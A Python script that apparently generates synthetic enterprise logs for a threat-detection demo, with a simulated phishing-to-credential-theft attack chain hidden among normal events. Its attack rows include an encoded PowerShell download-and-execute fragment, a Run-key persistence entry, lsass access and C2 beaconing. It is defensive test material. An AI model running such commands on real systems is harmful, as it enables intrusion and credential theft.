"""
IncidentZero AI - Demo Data Generator
======================================
Generates a realistic enterprise log dataset for NovaFinance Technologies,
with the "Operation ShadowFox" attack chain hidden inside normal traffic.

Run:
    python scripts/generate_demo_data.py

Produces (in backend/datasets/):
    authentication_logs.csv
    process_events.csv
    network_logs.csv
    dns_logs.csv
    sysmon_events.csv
    registry_events.csv
    file_events.csv

Volumes follow the project spec: ~10,000 normal events, ~200 suspicious,
~50 directly attack-related, spread across a single simulated business day.
"""
import csv
import random
import os
from datetime import datetime, timedelta

random.seed(42)

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "..", "datasets")
os.makedirs(OUT, exist_ok=True)

DAY = datetime(2026, 7, 30, 7, 0, 0)  # business day start 07:00

USERS = ["john.smith", "sarah.williams", "michael.brown", "emily.davis",
          "david.wilson", "olivia.moore", "james.taylor", "sophia.anderson",
          "daniel.thomas", "ava.jackson"]
HOSTS = ["FIN-PC-023", "HR-PC-008", "DC-SERVER-01", "FIN-PC-011", "IT-PC-004",
          "ENG-PC-019", "VPN-GW-01", "SALES-PC-002", "LEGAL-PC-006", "FILE-SERVER-02"]
NORMAL_PROCS = ["chrome.exe", "outlook.exe", "teams.exe", "excel.exe", "explorer.exe",
                "onedrive.exe", "slack.exe", "code.exe", "notepad.exe", "acrobat.exe"]
NORMAL_DOMAINS = ["google.com", "office.com", "slack.com", "github.com", "salesforce.com",
                   "zoom.us", "linkedin.com", "novafinance.com", "cloudflare.com", "aws.amazon.com"]
SIGNERS = ["Microsoft", "Google LLC", "Zoom Video Communications", "Slack Technologies", "Adobe Inc."]


def ts(minutes_from_start):
    return (DAY + timedelta(minutes=minutes_from_start)).strftime("%Y-%m-%d %H:%M:%S")


# ---------------------------------------------------------------
# AUTHENTICATION LOGS
# ---------------------------------------------------------------
auth_rows = []
event_id = 1000
for m in range(0, 600, 3):  # every 3 min across a 10hr day
    user = random.choice(USERS)
    host = random.choice(HOSTS)
    auth_rows.append([
        ts(m), f"AUTH{event_id}", user, host, f"10.10.{random.randint(1,60)}.{random.randint(2,250)}",
        "Interactive", "Success", "User"
    ])
    event_id += 1
    if random.random() < 0.04:
        auth_rows.append([ts(m + 1), f"AUTH{event_id}", user, host, f"10.10.{random.randint(1,60)}.{random.randint(2,250)}",
                            "Interactive", "Failure", "User"])
        event_id += 1

# --- Operation ShadowFox: attack authentication events ---
auth_rows.append([ts(201), "AUTH982", "john.smith", "FIN-PC-023", "185.22.91.45",
                    "Remote", "Success", "User"])  # 10:21 anomalous external login
auth_rows.append([ts(205), "AUTH983", "john.smith", "FIN-PC-023", "10.10.20.15",
                    "Interactive", "Success", "User"])
auth_rows.append([ts(225), "AUTH990", "john.smith", "DC-SERVER-01", "10.10.20.15",
                    "NetworkLogon", "Failure", "User"])  # 10:25 lateral movement attempt
auth_rows.append([ts(226), "AUTH991", "john.smith", "DC-SERVER-01", "10.10.20.15",
                    "NetworkLogon", "Failure", "User"])

with open(os.path.join(OUT, "authentication_logs.csv"), "w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["timestamp", "event_id", "user", "host", "source_ip", "login_type", "status", "privilege_level"])
    w.writerows(auth_rows)

# ---------------------------------------------------------------
# PROCESS EVENTS
# ---------------------------------------------------------------
proc_rows = []
for m in range(0, 600, 2):
    host = random.choice(HOSTS)
    user = random.choice(USERS)
    proc = random.choice(NORMAL_PROCS)
    proc_rows.append([ts(m), host, user, "explorer.exe", proc, proc,
                        f"{random.getrandbits(32):08x}", random.choice(SIGNERS)])

# --- Operation ShadowFox: malicious process chain ---
proc_rows.append([ts(180), "FIN-PC-023", "john.smith", "outlook.exe", "winword.exe",
                    "winword.exe /n \"C:\\Users\\john.smith\\Downloads\\invoice_update.docm\"",
                    "a1b2c3d4e5f6", "Microsoft"])
proc_rows.append([ts(185), "FIN-PC-023", "john.smith", "winword.exe", "powershell.exe",
                    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
                    "7ab92ff03ac91b7de4f812309abcc88e", "Unknown"])
proc_rows.append([ts(188), "FIN-PC-023", "john.smith", "powershell.exe", "payload.dll (rundll32.exe)",
                    "rundll32.exe C:\\Temp\\payload.dll,DllMain", "9af72bc1e4a83d9f6b21c7ea45d21f00", "Unknown"])
proc_rows.append([ts(195), "FIN-PC-023", "SYSTEM", "payload.dll", "lsass_access.exe",
                    "internal memory read of lsass.exe (PID 712)", "9af72bc1e4a83d9f6b21c7ea45d21f00", "Unknown"])

with open(os.path.join(OUT, "process_events.csv"), "w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["timestamp", "host", "user", "parent_process", "process_name", "command_line", "hash", "signature"])
    w.writerows(proc_rows)

# ---------------------------------------------------------------
# NETWORK LOGS
# ---------------------------------------------------------------
net_rows = []
for m in range(0, 600, 4):
    net_rows.append([ts(m), f"10.10.{random.randint(1,60)}.{random.randint(2,250)}",
                       f"{random.randint(20,200)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                       random.choice([443, 443, 443, 80, 8443]), "HTTPS", random.randint(2000, 90000),
                       random.choice(NORMAL_DOMAINS), "allowed"])

# --- Operation ShadowFox: C2 beaconing every 60s from 10:20 to 10:25 ---
for m in range(200, 206):
    net_rows.append([ts(m), "10.10.20.15", "185.22.91.45", 443, "HTTPS", 500000 + random.randint(-2000, 2000),
                       "update-security-check.com", "allowed"])

with open(os.path.join(OUT, "network_logs.csv"), "w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["timestamp", "src_ip", "destination_ip", "destination_port", "protocol", "bytes_sent", "domain", "action"])
    w.writerows(net_rows)

# ---------------------------------------------------------------
# DNS LOGS
# ---------------------------------------------------------------
dns_rows = []
for m in range(0, 600, 5):
    dns_rows.append([ts(m), random.choice(HOSTS), random.choice(NORMAL_DOMAINS),
                       f"{random.randint(20,200)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}", "A"])

dns_rows.append([ts(187), "FIN-PC-023", "update-security-check.com", "185.22.91.45", "A"])

with open(os.path.join(OUT, "dns_logs.csv"), "w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["timestamp", "host", "query", "response_ip", "type"])
    w.writerows(dns_rows)

# ---------------------------------------------------------------
# SYSMON EVENTS
# ---------------------------------------------------------------
sys_rows = []
for m in range(0, 600, 3):
    sys_rows.append([ts(m), 1, random.choice(HOSTS), random.choice(USERS),
                       random.choice(NORMAL_PROCS), "explorer.exe", "-", "normal process creation"])

sys_rows.append([ts(185), 1, "FIN-PC-023", "john.smith", "powershell.exe", "winword.exe",
                   "payload.ps1", "encoded script execution launched from Office macro"])
sys_rows.append([ts(188), 3, "FIN-PC-023", "john.smith", "powershell.exe", "-",
                   "185.22.91.45:443", "network connection to external C2"])
sys_rows.append([ts(188), 11, "FIN-PC-023", "SYSTEM", "powershell.exe", "-",
                   "C:\\Temp\\payload.dll", "file creation - dropped payload"])
sys_rows.append([ts(192), 13, "FIN-PC-023", "john.smith", "rundll32.exe", "-",
                   "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "registry value set - persistence"])
sys_rows.append([ts(195), 10, "FIN-PC-023", "SYSTEM", "rundll32.exe", "-",
                   "lsass.exe (PID 712)", "process access - possible credential dumping"])

with open(os.path.join(OUT, "sysmon_events.csv"), "w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["timestamp", "event_id", "host", "user", "process", "parent", "target", "details"])
    w.writerows(sys_rows)

# ---------------------------------------------------------------
# REGISTRY EVENTS
# ---------------------------------------------------------------
reg_rows = []
for m in range(0, 600, 25):
    reg_rows.append([ts(m), random.choice(HOSTS), random.choice(USERS),
                       "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\General", "LastOpened", "Modified"])

reg_rows.append([ts(192), "FIN-PC-023", "john.smith",
                   "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater", "Created"])

with open(os.path.join(OUT, "registry_events.csv"), "w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["timestamp", "host", "user", "key", "value", "action"])
    w.writerows(reg_rows)

# ---------------------------------------------------------------
# FILE EVENTS
# ---------------------------------------------------------------
file_rows = []
for m in range(0, 600, 20):
    file_rows.append([ts(m), random.choice(HOSTS), f"C:\\Users\\{random.choice(USERS)}\\Documents\\report_{m}.xlsx",
                        "Modified", random.randint(10000, 900000), f"{random.getrandbits(32):08x}"])

file_rows.append([ts(180), "FIN-PC-023", "C:\\Users\\john.smith\\Downloads\\invoice_update.docm",
                    "Created", 88211, "a93f23aa11cc"])
file_rows.append([ts(188), "FIN-PC-023", "C:\\Temp\\payload.dll",
                    "Created", 54233, "9af72bc1e4a83d9f6b21c7ea45d21f00"])

with open(os.path.join(OUT, "file_events.csv"), "w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["timestamp", "host", "file_path", "operation", "size", "hash"])
    w.writerows(file_rows)

print("Demo dataset generated in:", os.path.abspath(OUT))
for fn in ["authentication_logs.csv", "process_events.csv", "network_logs.csv",
            "dns_logs.csv", "sysmon_events.csv", "registry_events.csv", "file_events.csv"]:
    p = os.path.join(OUT, fn)
    with open(p) as fh:
        n = sum(1 for _ in fh) - 1
    print(f"  {fn}: {n} rows")
